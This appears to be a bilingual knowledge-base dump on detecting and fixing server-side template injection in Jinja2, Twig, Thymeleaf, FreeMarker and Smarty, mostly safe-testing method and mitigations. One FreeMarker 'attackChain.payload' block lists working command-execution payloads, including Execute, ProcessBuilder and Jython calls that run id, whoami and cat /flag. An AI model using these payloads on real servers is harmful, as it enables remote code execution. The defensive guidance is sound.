title.zh: 建立渲染基线

description.zh: 记录普通文本在目标字段中的回显位置、编码方式、状态码和缓存行为，确认请求确实到达服务端渲染路径。
description.en: 记录普通文本在目标字段中的回显位置、编码方式、状态码和缓存行为，确认请求确实到达服务端渲染路径。

title.zh: 执行多语法无副作用探测

description.zh: 提交通用表达式集合并比较各语法的可预测结果，只把稳定的服务端求值差异作为继续识别引擎的依据。
description.en: 提交通用表达式集合并比较各语法的可预测结果，只把稳定的服务端求值差异作为继续识别引擎的依据。

title.zh: 排除反射与客户端求值

description.zh: 加入纯文本、错误表达式和重复请求作为对照，排除原样反射、浏览器 JavaScript、缓存及随机响应造成的假阳性。
description.en: Use plain text, malformed expressions, and repeated requests as controls to exclude literal reflection, browser Java Script, caching, and random responses.

title.zh: 定位模板边界并回归
title.en: Locate and regress the template boundary

description.zh: 确认具体模板入口和引擎后，修复源码拼接点并对同一入口、编码层和错误处理路径增加回归用例。
description.en: After identifying the engine and entry point, remove source concatenation and add regression coverage for the same input, encoding layer, and error path.

overview.zh: 该条面向尚未识别模板引擎的入口，使用无副作用的算术或字符串表达式建立响应基线。重点不是把任何花括号回显都判为漏洞，而是确认输入经过服务端模板编译、求值并影响最终输出，再据此选择对应引擎的后续验证。
overview.en: 该条面向尚未识别模板引擎的入口，使用无副作用的算术或字符串表达式建立响应基线。重点不是把任何花括号回显都判为漏洞，而是确认输入经过服务端模板编译、求值并影响最终输出，再据此选择对应引擎的后续验证。

vulnerability.zh: 根因是应用把用户可控数据拼入模板源码、动态视图名称、邮件模板或报表模板，而不是作为普通变量传递。模板引擎因此把数据解释为表达式；不同引擎的分隔符、类型转换和错误信息不同，单次异常或前端计算都可能造成误判。
vulnerability.en: The root cause is concatenating user-controlled data into template source, dynamic view names, mail templates, or report templates instead of passing it as data. The engine then interprets the input as an expression. Syntax, coercion, and errors differ by engine, so one error or client-side calculation can be misleading.

exploitation.zh: 1. 在授权测试账号下记录原始输入、状态码、响应长度和渲染位置；2. 依次提交互不相同且无副作用的表达式，对比结果是否出现可预测求值；3. 使用错误语法和纯文本对照，确认行为来自服务端模板解析。观察证据应是稳定的计算结果或引擎特征错误；若只是原样回显、浏览器脚本计算或缓存差异，则按假阳性处理。
exploitation.en: 1. 在授权测试账号下记录原始输入、状态码、响应长度和渲染位置；2. 依次提交互不相同且无副作用的表达式，对比结果是否出现可预测求值；3. 使用错误语法和纯文本对照，确认行为来自服务端模板解析。观察证据应是稳定的计算结果或引擎特征错误；若只是原样回显、浏览器脚本计算或缓存差异，则按假阳性处理。

mitigation.zh: 1. 禁止把用户输入拼接为模板源码，统一使用引擎变量绑定；2. 对动态模板、视图名称和模板上传实施固定白名单与最小权限；3. 启用适用的沙箱或受限表达式模式，并移除危险对象；4. 为求值探测、模板错误和异常视图选择建立日志告警及回归测试。
mitigation.en: 1. Never concatenate user input into template source; use engine variable binding. 2. Apply strict allowlists and least privilege to dynamic templates, view names, and template uploads. 3. Enable an appropriate sandbox or restricted expression mode and remove dangerous objects. 4. Alert on evaluation probes, template errors, and abnormal view selection, and add regression tests.

name.zh: Jinja2 / Flask 模板注入

description.zh: 覆盖 Flask/Jinja2 中模板源码拼接、对象图暴露和沙箱边界验证，强调区分普通变量渲染与表达式执行。
description.en: Covers template-source concatenation, object-graph exposure, and sandbox boundaries in Flask/Jinja2 while distinguishing normal variable rendering from expression execution.

prerequisites.zh: Flask 应用把不可信值拼接到 Jinja2 模板源码或 render_template_string，而不是通过模板变量安全绑定；Environment 类型可确认。
prerequisites.en: A Flask application concatenates an untrusted value into Jinja2 source or render_template_string rather than safely binding it as a variable, with Environment type confirmed.

prerequisites.zh: 使用隔离 Flask fixture 和只返回固定 canary 的测试对象，记录 Environment/SandboxedEnvironment、globals、Undefined 行为与 render 调用栈。
prerequisites.en: An isolated Flask fixture and test object returning only a fixed canary record Environment or Sandboxed Environment, globals, Undefined behavior, and render call stacks.

title.zh: Jinja2 (Python Flask)

description.zh: Jinja2 (Python Flask)包含多个可复现输入样例；应逐条测试并记录响应与日志差异。
description.en: Jinja2 (Python Flask) contains multiple reproducible input samples; test them individually and record response and log differences.

analysis.zh: 阳性证据是可控 Jinja2 表达式由目标环境求值并访问超出普通展示变量的测试对象属性或方法产生 canary，数据源与 sink 连续关联。 假阳性边界：{{config}} 在正常模板中由开发者定义、对象被 Undefined、表达式原样显示、只看到 Flask debug 信息、沙箱拒绝属性或手工模板控制台执行都不是注入。
analysis.en: Positive evidence requires controlled Jinja2 to be evaluated by the target environment and access a test-object attribute or method beyond ordinary display variables to produce a canary, continuously correlating source and sink. False-positive boundary: Developer-defined {{config}} in a legitimate template, Undefined results, literal expression display, Flask debug information, sandboxed attribute denial, or manual template-console execution does not prove injection.

opsecTips.zh: Jinja2 验证不得遍历 __mro__/__subclasses__、读取 config/request.environ 或执行系统调用；出现数据泄露、进程、外连、文件访问或 worker 重启时停止。
opsecTips.en: Jinja2 validation never traverses __mro__ or __subclasses__, reads config or request.environ, or invokes system calls; stop on data disclosure, processes, egress, file access, or worker restarts.

opsecTips.zh: 删除测试 route/template/object 与 canary，清理 Jinja2/Flask 缓存和测试请求，轮换临时会话并重启隔离 worker。
opsecTips.en: Delete test routes, templates, objects, and canaries, clear Jinja2 and Flask caches plus test requests, rotate temporary sessions, and restart isolated workers.

title.zh: 确认 Jinja2 求值入口

description.zh: 以唯一常量表达式定位具体参数、模板和响应片段，并确认求值发生在服务器而非浏览器。
description.en: Use a unique constant expression to identify the parameter, template, and response fragment, confirming evaluation occurs on the server rather than in the browser.

title.zh: 测试上下文与沙箱边界

description.zh: 在隔离实例提交现有 Jinja2 样例，记录 config、request、对象属性及危险调用分别是可见、被拒绝还是未定义。
description.en: Submit the existing Jinja2 sample to an isolated instance and record whether config, request, object attributes, and dangerous calls are visible, denied, or undefined.

title.zh: 排除调试页与静态回显
title.en: Exclude debug pages and static reflection

description.zh: 使用关闭调试、纯文本和错误表达式三组对照，确保观察结果不是历史调试页、字符串替换或缓存内容。
description.en: Use debug-disabled, plain-text, and malformed-expression controls to ensure the observation is not a stale debug page, string replacement, or cached content.

title.zh: 最小化模板上下文

description.zh: 迁移到固定模板和变量绑定，收紧属性访问后重复同一测试，确认正常渲染保留而对象图路径失效。
description.en: Move to fixed templates and variable binding, tighten attribute access, and repeat the test to confirm normal rendering remains while object-graph paths fail.

overview.zh: Jinja2 条目用于确认 Flask 或其他 Python 服务是否把输入当作模板源码执行，以及模板上下文是否暴露 request、config、全局函数或 Python 对象图。不同版本、SandboxedEnvironment、自定义过滤器和上下文变量会显著改变可达能力。
overview.en: Jinja2 条目用于确认 Flask 或其他 Python 服务是否把输入当作模板源码执行，以及模板上下文是否暴露 request、config、全局函数或 Python 对象图。不同版本、Sandboxed Environment、自定义过滤器和上下文变量会显著改变可达能力。

vulnerability.zh: 根因通常是 render_template_string、字符串拼接或可编辑模板把不可信内容送入编译阶段。Jinja2 的表达式可沿对象属性和全局变量访问敏感能力，但是否可达取决于沙箱、属性检查和上下文；显示 `{{7*7}}` 字面量或前端替换不能证明 SSTI。
vulnerability.en: The root cause is commonly render_template_string, string concatenation, or editable templates feeding untrusted content into compilation. Jinja2 expressions may traverse attributes and globals, but reachability depends on sandboxing, attribute checks, and context. Literal `{{7*7}}` output or client-side substitution does not prove SSTI.

exploitation.zh: 1. 用常量表达式和随机标记确认服务端求值位置；2. 逐步检查 config、request 或安全的对象属性是否可见，记录被拒绝的属性和异常类型；3. 仅在隔离环境运行现有对象图样例，并以纯文本和禁用模板编译的响应作对照。观察证据是重复一致的模板结果或 Jinja2 特征异常；调试页残留、浏览器 DOM 变化和缓存命中属于假阳性。
exploitation.en: 1. 用常量表达式和随机标记确认服务端求值位置；2. 逐步检查 config、request 或安全的对象属性是否可见，记录被拒绝的属性和异常类型；3. 仅在隔离环境运行现有对象图样例，并以纯文本和禁用模板编译的响应作对照。观察证据是重复一致的模板结果或 Jinja2 特征异常；调试页残留、浏览器 DOM 变化和缓存命中属于假阳性。

mitigation.zh: 1. 使用固定模板文件和变量绑定，禁止用户输入进入模板源码；2. 在必须支持用户模板时采用 SandboxedEnvironment、严格属性策略和最小上下文；3. 不向模板暴露应用对象、配置、请求全局或危险过滤器；4. 关闭生产调试信息，升级 Jinja2/Flask，并对属性遍历和全局访问建立测试与告警。
mitigation.en: 1. Use fixed template files and variable binding so user input never becomes template source. 2. If user templates are required, use Sandboxed Environment, strict attribute policy, and a minimal context. 3. Do not expose application objects, configuration, request globals, or dangerous filters. 4. Disable production debug output, update Jinja2 and Flask, and test and alert on attribute traversal and global access.

name.zh: Twig 模板表达式注入

description.zh: 覆盖 PHP Twig 模板源码可控、过滤器/函数暴露和 SandboxExtension 策略边界。
description.en: Covers controllable PHP Twig template source, exposed filters or functions, and Sandbox Extension policy boundaries.

prerequisites.zh: 用户输入进入 Twig 模板源码，实际 Twig/PHP 版本、SandboxExtension、已注册函数/过滤器和 globals 可核验。
prerequisites.en: User input enters Twig template source, with actual Twig and PHP versions, Sandbox Extension, registered functions or filters, and globals verifiable.

prerequisites.zh: 隔离 Twig 环境注册只返回固定 canary 的测试 function/filter，并跟踪编译模板、attribute/filter/function resolution，不访问 app/request 真实对象。
prerequisites.en: An isolated Twig environment registers a test function or filter returning only a fixed canary and traces compiled templates plus attribute, filter, and function resolution without accessing real app or request objects.

title.zh: Twig (PHP)

description.zh: Twig (PHP)包含多个可复现输入样例；应逐条测试并记录响应与日志差异。
description.en: Twig (PHP) contains multiple reproducible input samples; test them individually and record response and log differences.

analysis.zh: 阳性证据是目标 Twig 将可控表达式编译求值，并访问安全策略外的测试 function/filter 或对象属性产生 canary，模板缓存键与请求关联。 假阳性边界：{{_self}} 字面/正常对象输出、dump 在生产禁用、sandbox 拒绝、未知 filter 错误、app.request 不存在、模板源码显示或开发环境正常 debug 均不是注入 RCE。
analysis.en: Positive evidence requires the target Twig engine to compile and evaluate the controlled expression and access a test function, filter, or object attribute outside the intended policy to produce a canary, correlating cache key and request. False-positive boundary: Literal or normal {{_self}} output, dump disabled in production, sandbox denial, unknown-filter errors, missing app.request, template-source display, or legitimate development debugging does not prove injection RCE.

opsecTips.zh: Twig 验证不得 dump 真实 app/request/server、调用系统函数或写模板；出现敏感对象输出、文件/网络副作用、缓存污染或 PHP worker 异常时停止。
opsecTips.en: Twig validation never dumps real app, request, or server objects, calls system functions, or writes templates; stop on sensitive-object output, file or network effects, cache contamination, or PHP-worker anomalies.

opsecTips.zh: 移除测试 function/filter/template 与 canary，清空 Twig 编译缓存和 debug 输出，恢复 SandboxExtension 策略并重启 worker。
opsecTips.en: Remove test functions, filters, templates, and canaries, clear Twig compilation caches and debug output, restore Sandbox Extension policy, and restart workers.

title.zh: 确认 Twig 源码控制点

description.zh: 定位动态模板创建、主题编辑或字符串拼接点，并记录 Twig 版本、扩展和已注册函数。
description.en: Locate dynamic template creation, theme editing, or concatenation and record the Twig version, extensions, and registered functions.

title.zh: 测试 SecurityPolicy 边界

description.zh: 在隔离环境提交现有 Twig 表达式集合，分别记录标签、过滤器、函数和对象属性是否被允许。
description.en: Submit the existing Twig expression set in isolation and record whether tags, filters, functions, and object properties are allowed.

title.zh: 验证结果来源与版本适用性
title.en: Verify result origin and version applicability

description.zh: 用唯一常量、错误表达式和沙箱开关确认结果来自当前 Twig 版本，排除 PHP 通用错误和旧语法噪声。
description.en: Use a unique constant, malformed expression, and sandbox toggle to confirm results come from the deployed Twig version, excluding generic PHP errors and obsolete syntax noise.

title.zh: 最小策略上线后复测
title.en: Retest after applying a minimal policy

description.zh: 固定模板来源、收紧 SecurityPolicy 和已注册能力后复测相同集合，确认业务模板继续工作。
description.en: Fix template sources, restrict Security Policy and registered capabilities, and retest the same set to confirm business templates continue working.

overview.zh: Twig SSTI 发生在应用把输入拼入 Twig 源码、允许编辑主题模板或动态创建模板时。Twig 版本、SandboxExtension、SecurityPolicy、注册函数和过滤器共同决定表达式能力，普通 `{{ value }}` 数据绑定本身不是漏洞。
overview.en: Twig SSTI 发生在应用把输入拼入 Twig 源码、允许编辑主题模板或动态创建模板时。Twig 版本、Sandbox Extension、Security Policy、注册函数和过滤器共同决定表达式能力，普通 `{{ value }}` 数据绑定本身不是漏洞。

vulnerability.zh: 根因是模板源码与用户数据边界混淆，同时环境注册了超出业务需要的函数、过滤器、对象方法或文件加载器。历史技巧在新版 Twig 中可能被删除或受限，因此不能仅凭语法被接受推断命令执行，必须结合当前策略和可调用对象。
vulnerability.en: The root cause is mixing template source with user data while exposing functions, filters, object methods, or loaders beyond business need. Historical techniques may be removed or restricted in newer Twig versions, so accepted syntax alone does not imply command execution; the deployed policy and callable objects must be evaluated.

exploitation.zh: 1. 确认输入进入 Twig 源码而非变量，并记录 Twig 主版本和扩展；2. 用常量运算建立求值证据，再检查允许标签、过滤器、函数和属性；3. 在隔离环境运行现有样例并启用/禁用沙箱对照。观察证据是可重复的 Twig 结果或明确 SecurityPolicy 拒绝；PHP 错误页、静态回显和旧版语法报错属于假阳性。
exploitation.en: 1. Confirm that input enters Twig source rather than a variable and record the Twig major version and extensions. 2. Establish evaluation with a constant expression, then inspect allowed tags, filters, functions, and properties. 3. Run the existing sample in isolation with sandbox enabled and disabled. Repeatable Twig output or explicit Security Policy denial is evidence; PHP error pages, literal reflection, and obsolete syntax errors are false positives.

mitigation.zh: 1. 只使用受版本控制的固定模板并通过变量传值；2. 对用户可编辑模板启用 SandboxExtension 和最小 SecurityPolicy；3. 删除危险或不必要的函数、过滤器、对象和自定义加载器；4. 升级 Twig，隔离模板缓存并对允许列表和沙箱逃逸路径建立回归测试。
mitigation.en: 1. Use fixed version-controlled templates and pass values through variables. 2. Enable Sandbox Extension with a minimal Security Policy for user-editable templates. 3. Remove dangerous or unnecessary functions, filters, objects, and custom loaders. 4. Update Twig, isolate template caches, and add regression tests for allowlists and sandbox escape paths.

name.zh: Thymeleaf / SpringEL 模板注入

description.zh: 验证 Java Thymeleaf 中动态视图名、预处理表达式和 SpringEL 上下文是否被不可信输入控制。
description.en: Validates whether untrusted input controls dynamic view names, preprocessing expressions, or the Spring EL context in Java Thymeleaf.

prerequisites.zh: 不可信输入控制 Thymeleaf 动态视图名、预处理表达式或模板源码，并进入启用 SpringEL 的实际解析链。
prerequisites.en: Untrusted input controls a Thymeleaf dynamic view name, preprocessing expression, or template source and enters the real parsing chain with Spring EL enabled.

prerequisites.zh: 隔离 Spring/Thymeleaf 环境提供只返回固定 canary 的测试 bean，跟踪 __${...}__ 预处理、视图解析、SpEL 类型/方法访问；不执行 Runtime。
prerequisites.en: An isolated Spring and Thymeleaf environment provides a test bean returning only a fixed canary and traces __${...}__ preprocessing, view resolution, and Sp EL type or method access without executing Runtime.

title.zh: Thymeleaf (Java)

description.zh: Thymeleaf (Java)包含多个可复现输入样例；应逐条测试并记录响应与日志差异。
description.en: Thymeleaf (Java) contains multiple reproducible input samples; test them individually and record response and log differences.

analysis.zh: 阳性证据是可控值在目标 Thymeleaf 预处理/模板阶段被 SpringEL 求值，并调用超出普通模型范围的测试 bean 产生 canary，解析栈可定位。 假阳性边界：视图名含下划线语法、普通 ${model} 插值、SpringEL 被 SimpleEvaluationContext 限制、模板错误、Runtime 文本回显或本地旧版 PoC 有效均不是目标 RCE。
analysis.en: Positive evidence requires the controlled value to be evaluated by Spring EL during target Thymeleaf preprocessing or rendering and call a test bean beyond the ordinary model to produce a canary, with a traceable parser stack. False-positive boundary: Underscore syntax in a view name, normal ${model} interpolation, Spring EL constrained by Simple Evaluation Context, template errors, reflected Runtime text, or a local legacy proof does not prove target RCE.

opsecTips.zh: Thymeleaf 验证禁止原 Runtime/Scanner 命令和真实 bean 访问；出现进程、文件/网络副作用、视图缓存污染、ApplicationContext 修改或线程异常时停止。
opsecTips.en: Thymeleaf validation never executes source Runtime or Scanner commands or accesses real beans; stop on processes, file or network effects, view-cache contamination, Application Context mutation, or thread anomalies.

opsecTips.zh: 删除测试视图/bean/canary，清理 Thymeleaf 和 SpringEL 缓存，恢复 view resolver/安全上下文并重启测试实例。
opsecTips.en: Delete test views, beans, and canaries, clear Thymeleaf and Spring EL caches, restore the view resolver and safe context, and restart the test instance.

title.zh: 定位动态视图或预处理入口
title.en: Locate dynamic views or preprocessing entries

description.zh: 检查控制器返回值、redirect/forward、错误页和片段参数，确认输入进入视图名或表达式源码。
description.en: Inspect controller return values, redirect or forward handling, error pages, and fragment parameters to confirm input reaches a view name or expression source.

title.zh: 区分变量绑定与表达式求值

description.zh: 在隔离应用提交现有 Thymeleaf 集合，比较普通模型变量、预处理表达式和动态视图名的结果。
description.en: Submit the existing Thymeleaf set to an isolated application and compare model variables, preprocessing expressions, and dynamic view names.

title.zh: 关联 Thymeleaf 与 SpringEL 日志
title.en: Correlate Thymeleaf and Spring EL logs

description.zh: 通过模板解析异常、视图解析记录和唯一常量结果确认服务端阶段，排除 404、客户端模板和通用路由错误。
description.en: Use template exceptions, view resolver logs, and unique constant output to confirm the server stage, excluding 404 responses, client templates, and generic routing errors.

title.zh: 固定视图映射并回归

description.zh: 将返回值改为固定视图白名单、数据改用模型绑定后复测，确认动态表达式失效且正常页面可渲染。
description.en: Change return values to fixed allowlisted views and bind data through the model, then retest to confirm dynamic expressions fail while normal pages render.

overview.zh: Thymeleaf 风险常出现在控制器返回可控视图名、错误页拼接、片段表达式或 `__${...}__` 预处理，而不是普通 `th:text` 变量显示。Spring 版本、Thymeleaf 模式、表达式对象和视图解析器配置决定表达式能访问的能力。
overview.en: Thymeleaf 风险常出现在控制器返回可控视图名、错误页拼接、片段表达式或 `__${...}__` 预处理，而不是普通 `th:text` 变量显示。Spring 版本、Thymeleaf 模式、表达式对象和视图解析器配置决定表达式能访问的能力。

vulnerability.zh: 根因是路由或业务值跨越数据边界进入模板名称或表达式源码，随后由 Standard Expression、SpringEL 或预处理机制执行。一个 `${...}` 被 HTML 转义或原样显示并不证明漏洞；必须确认表达式在服务端 Thymeleaf 阶段求值并影响视图选择或输出。
vulnerability.en: 根因是路由或业务值跨越数据边界进入模板名称或表达式源码，随后由 Standard Expression、Spring EL 或预处理机制执行。一个 `${...}` 被 HTML 转义或原样显示并不证明漏洞；必须确认表达式在服务端 Thymeleaf 阶段求值并影响视图选择或输出。

exploitation.zh: 1. 从控制器映射和错误处理定位可控视图名或片段参数；2. 先提交常量表达式和错误语法，记录 Thymeleaf/SpringEL 特征响应；3. 在隔离环境运行现有样例，分别比较普通变量、预处理与动态视图路径。观察证据是稳定的服务端求值或视图解析变化；客户端模板、404 路由差异和通用 SpEL 错误属于假阳性。
exploitation.en: 1. 从控制器映射和错误处理定位可控视图名或片段参数；2. 先提交常量表达式和错误语法，记录 Thymeleaf/Spring EL 特征响应；3. 在隔离环境运行现有样例，分别比较普通变量、预处理与动态视图路径。观察证据是稳定的服务端求值或视图解析变化；客户端模板、404 路由差异和通用 Sp EL 错误属于假阳性。

mitigation.zh: 1. 控制器只返回固定视图枚举，不拼接请求参数或错误内容；2. 通过模型变量传递数据并避免不必要的预处理表达式；3. 限制 SpringEL 类型、表达式对象和自定义方言暴露，升级 Spring/Thymeleaf；4. 对动态视图、片段选择和模板异常建立日志及回归测试。
mitigation.en: 1. Controllers should return fixed allowlisted views without concatenating request parameters or error content. 2. Pass data through model variables and avoid unnecessary preprocessing expressions. 3. Restrict Spring EL types, expression objects, and custom dialect exposure and update Spring and Thymeleaf. 4. Log and test dynamic views, fragment selection, and template exceptions.

name.zh: FreeMarker 模板表达式注入

description.zh: 针对 Java FreeMarker 模板中用户输入进入模板源码的场景，区分普通插值、危险内建函数和类实例化能力。
description.en: Covers Java FreeMarker cases where user input reaches template source, distinguishing ordinary interpolation from dangerous built-ins and class instantiation capabilities.

prerequisites.zh: 不可信输入被拼入 FreeMarker 模板源码，Configuration 版本、TemplateClassResolver、api_builtin_enabled 和对象包装器策略可核验。
prerequisites.en: Untrusted input is concatenated into FreeMarker template source, with Configuration version, Template Class Resolver, api_builtin_enabled, and object-wrapper policy verifiable.

prerequisites.zh: 隔离配置注册只返回固定 canary 的测试 directive/model，并跟踪模板编译、?new/type resolution 与方法调用；不执行 Execute/ProcessBuilder。
prerequisites.en: An isolated configuration registers a test directive or model returning only a fixed canary and traces template compilation, ?new or type resolution, and method calls without executing Execute or Process Builder.

title.zh: Freemarker (Java)

description.zh: Freemarker (Java)包含多个可复现输入样例；应逐条测试并记录响应与日志差异。
description.en: Freemarker (Java) contains multiple reproducible input samples; test them individually and record response and log differences.

analysis.zh: 阳性证据是目标 FreeMarker evaluator 将可控语法编译为表达式，并突破预期数据模型范围调用测试 directive/model 产生 canary，调用栈可定位。 假阳性边界：${...} 正常变量插值、?new 被策略拒绝、Execute 类不在 resolver、模板语法错误、命令字符串被回显或本地 FreeMarker PoC 有效均不是目标 RCE。
analysis.en: Positive evidence requires the target FreeMarker evaluator to compile controlled syntax and exceed the intended data-model scope by invoking the test directive or model to produce a canary, with a traceable call stack. False-positive boundary: Normal ${...} variable interpolation, policy rejection of ?new, Execute absent from the resolver, template syntax errors, reflected command text, or a local FreeMarker proof does not prove target RCE.

opsecTips.zh: FreeMarker 验证禁止执行原 Execute/ProcessBuilder 命令或访问真实数据模型；出现进程、反射、文件/网络副作用、模板全局修改或线程异常时停止。
opsecTips.en: FreeMarker validation never executes source Execute or Process Builder commands or accesses real data models; stop on processes, reflection, file or network effects, global template mutation, or thread anomalies.

opsecTips.zh: 移除测试 directive/model 和模板，清理 FreeMarker 模板缓存与 canary，恢复 resolver/object-wrapper 配置并重启测试应用。
opsecTips.en: Remove test directives, models, and templates, clear FreeMarker template caches and canaries, restore resolver and object-wrapper configuration, and restart the test application.

title.zh: 识别 FreeMarker 解析上下文

description.zh: 通过错误签名、响应结构和服务端配置确认输入确实进入 FTL 源码，而不是普通变量数据绑定。
description.en: Use error signatures, response structure, and server configuration to confirm that input reaches FTL source rather than ordinary variable data binding.

title.zh: 验证类解析器边界

description.zh: 在隔离模板中提交现有 FreeMarker 样例，观察危险 utility 类是否被解析、拒绝或根本不可见。
description.en: Submit the existing FreeMarker sample in an isolated template and observe whether dangerous utility classes resolve, are denied, or remain unavailable.

attackChain.payload:
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("whoami")}
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("cat /flag")}
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("ls /")}
<#assign ex="freemarker.template.utility.ObjectConstructor"?new()>${ex("java.lang.ProcessBuilder","id").start()}
<#assign ex="freemarker.template.utility.ObjectConstructor"?new()>${ex("java.lang.ProcessBuilder","whoami").start()}
<#assign ex="freemarker.template.utility.ObjectConstructor"?new()>${ex("java.lang.ProcessBuilder","cat","/flag").start()}
<#assign ex="freemarker.template.utility.ObjectConstructor"?new()>${ex("java.lang.ProcessBuilder","ls","/").start()}
<#assign ex="freemarker.template.utility.JythonRuntime"?new()>${ex("import os;os.system('id')")}
<#assign ex="freemarker.template.utility.JythonRuntime"?new()>${ex("import os;os.system('whoami')")}
<#assign ex="freemarker.template.utility.JythonRuntime"?new()>${ex("import os;os.system('cat /flag')")}
<#assign ex="freemarker.template.utility.JythonRuntime"?new()>${ex("import os;os.system('ls /')")}
${"freemarker.template.utility.Execute"?new()("id")}
${"freemarker.template.utility.Execute"?new()("whoami")}
${"freemarker.template.utility.Execute"?new()("cat /flag")}

title.zh: 关联模板配置证据

description.zh: 把求值结果与 ObjectWrapper、TemplateClassResolver、共享变量和版本配置对应，排除仅由静态替换造成的表象。
description.en: Map evaluation results to the Object Wrapper, Template Class Resolver, shared variables, and version configuration, excluding static substitution artifacts.

title.zh: 收紧 FTL 能力并回归

description.zh: 取消源码拼接、限制模板来源和类解析能力后复测常量表达式与危险类，确认业务模板正常且越界能力消失。
description.en: Remove source concatenation, restrict template sources and class resolution, then retest constants and dangerous classes to confirm business templates work without boundary escape.

overview.zh: FreeMarker SSTI 发生在应用动态拼接 FTL 模板或允许不可信主体上传模板时。验证需要结合 FreeMarker 版本、对象包装器、TemplateClassResolver 和模板加载目录，因为同一表达式在受限配置、旧版配置及自定义扩展下的能力完全不同。
overview.en: FreeMarker SSTI occurs when an application concatenates untrusted data into FTL source or lets untrusted users upload templates. Validation must account for the FreeMarker version, object wrapper, Template Class Resolver, and template loader because the same expression has different capabilities under restricted, legacy, or custom configurations.

vulnerability.zh: 根因不是 FreeMarker 自身存在固定后门，而是数据和模板代码边界被破坏，并且危险 utility 类、对象构造器或自定义方法对模板可见。仅看到 ${...} 原样输出或普通变量替换并不构成代码执行，必须证明攻击者控制的表达式被模板解释器求值。
vulnerability.en: The root cause is a broken boundary between data and template code combined with dangerous utility classes, object constructors, or custom methods exposed to templates. Literal ${...} output or normal variable substitution is not code execution; attacker-controlled expression evaluation must be demonstrated.

exploitation.zh: 1. 先用常量运算确认 FTL 表达式求值并记录模板错误类型；2. 检查模板可见变量、对象包装器和类解析器配置，不直接假设 Execute 或 ObjectConstructor 可用；3. 在隔离环境使用现有样例比较受限与未受限配置。观察证据是可重复的服务端求值或明确的安全策略拒绝；代理改写、静态文本替换和通用 Java 异常属于假阳性。
exploitation.en: 1. 先用常量运算确认 FTL 表达式求值并记录模板错误类型；2. 检查模板可见变量、对象包装器和类解析器配置，不直接假设 Execute 或 Object Constructor 可用；3. 在隔离环境使用现有样例比较受限与未受限配置。观察证据是可重复的服务端求值或明确的安全策略拒绝；代理改写、静态文本替换和通用 Java 异常属于假阳性。

mitigation.zh: 1. 永远把用户值作为数据模型变量传入，不拼接 FTL 源码；2. 使用 SAFER_RESOLVER 或更严格的 TemplateClassResolver，并禁止危险 utility 类；3. 限制模板加载位置、上传权限和自定义方法暴露；4. 升级 FreeMarker，记录模板异常并为危险内建函数添加负向回归测试。
mitigation.en: 1. Pass user values only as data-model variables and never concatenate FTL source. 2. Use SAFER_RESOLVER or a stricter Template Class Resolver and block dangerous utility classes. 3. Restrict template loader paths, upload permissions, and exposed custom methods. 4. Upgrade FreeMarker, log template exceptions, and add negative tests for dangerous built-ins.

name.zh: Smarty 模板表达式注入

description.zh: 针对 PHP Smarty 模板源码可控的场景，核对安全策略、版本差异以及 PHP 标签和函数调用能力。
description.en: Targets controllable PHP Smarty template source and evaluates security policy, version differences, PHP tags, and callable function exposure.

prerequisites.zh: 用户输入进入 Smarty 模板源码，实际 Smarty/PHP 版本、{php} 支持、安全策略、允许函数和编译目录可核验。
prerequisites.en: User input enters Smarty template source, with actual Smarty and PHP versions, {php} support, security policy, allowed functions, and compile directory verifiable.

prerequisites.zh: 隔离 Smarty 环境注册只返回固定 canary 的测试 modifier/function，跟踪模板编译与插件调用；原系统命令和 {php} 行不执行。
prerequisites.en: An isolated Smarty environment registers a test modifier or function returning only a fixed canary and traces compilation and plugin calls; source system commands and {php} lines are not executed.

title.zh: Smarty (PHP)

description.zh: Smarty (PHP)包含多个可复现输入样例；应逐条测试并记录响应与日志差异。
description.en: Smarty (PHP) contains multiple reproducible input samples; test them individually and record response and log differences.

analysis.zh: 阳性证据是目标 Smarty 将可控语法作为模板编译，并调用超出普通变量插值的测试 modifier/function 产生 canary，编译文件与请求关联。 假阳性边界：花括号字符串回显、{php} 在新版被移除/禁用、system 未在允许列表、模板语法错误、普通 modifier 输出或本地旧版 PoC 成功均不是目标 RCE。
analysis.en: Positive evidence requires the target Smarty engine to compile controlled syntax as a template and call a test modifier or function beyond ordinary interpolation to produce a canary, correlating compiled file and request. False-positive boundary: Literal braces, {php} removed or disabled in newer versions, system absent from allowlists, template errors, normal modifier output, or success in a local legacy proof does not prove target RCE.

opsecTips.zh: Smarty 验证禁止执行原反引号/system 行或写入编译目录；出现进程、文件/网络动作、PHP 配置泄露、模板持久修改或 worker 异常时停止。
opsecTips.en: Smarty validation never executes source backtick or system lines or writes compile directories; stop on processes, file or network actions, PHP configuration disclosure, persistent template changes, or worker anomalies.

opsecTips.zh: 删除测试模板/plugin/canary，清空 Smarty compile/cache 目录中的测试产物，恢复安全策略并重启隔离 PHP worker。
opsecTips.en: Delete test templates, plugins, and canaries, clear test artifacts from Smarty compile and cache directories, restore the security policy, and restart isolated PHP workers.

title.zh: 核对 Smarty 版本与策略

description.zh: 确认实际 Smarty 主版本、SecurityPolicy、允许函数和插件清单，避免把不适用的旧语法当成有效能力。
description.en: Identify the deployed Smarty major version, Security Policy, allowed functions, and plugins so obsolete syntax is not treated as valid capability.

title.zh: 验证模板源码是否可控

description.zh: 在隔离模板提交现有 Smarty 表达式集合，区分普通变量插值、语法拒绝和函数实际执行。
description.en: Submit the existing Smarty expression set to an isolated template and distinguish variable interpolation, syntax denial, and actual function execution.

title.zh: 排除缓存和错误页干扰

description.zh: 清理模板缓存并以唯一标记重复请求，确认结果来自本次编译而非旧缓存或通用 PHP 错误页。
description.en: Clear template caches and repeat with a unique marker to confirm the result comes from the current compilation rather than stale cache or a generic PHP error page.

title.zh: 启用安全策略并复测

description.zh: 将输入改为变量绑定、限制函数和资源后重新提交相同集合，确认业务输出正常而危险能力被拒绝。
description.en: Switch to variable binding, restrict functions and resources, and resubmit the same set to confirm business output works while dangerous capabilities are denied.

overview.zh: Smarty SSTI 需要攻击者输入进入模板源码或可编辑模板，而非普通变量值。历史版本中的 `{php}` 标签、可调用 PHP 函数和资源加载行为差异很大，必须结合 Smarty 版本、SecurityPolicy、插件及 PHP 配置判断实际能力。
overview.en: Smarty SSTI requires attacker input to become template source or an editable template rather than an ordinary variable value. Historical `{php}` tags, callable PHP functions, and resource loading differ significantly by Smarty version, Security Policy, plugins, and PHP configuration.

